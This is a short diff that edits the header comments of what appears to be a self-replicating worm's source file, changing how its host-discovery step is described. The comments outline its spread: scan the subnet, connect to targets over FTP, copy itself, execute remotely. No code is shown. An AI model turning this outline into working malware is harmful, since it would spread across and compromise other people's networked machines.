@@ -1,5 +1,5 @@
 // === Self-Replicating Worm ===
-// Sends ARP requests to all hosts in the subnet and listens for replies to detect active devices.
+// Sends pings to all hosts in the subnet and listens for replies to detect active devices.
 // Starting from first target, connect via FTP, then copy the worm to target.
 // Remote execute worm from target machine.
 //
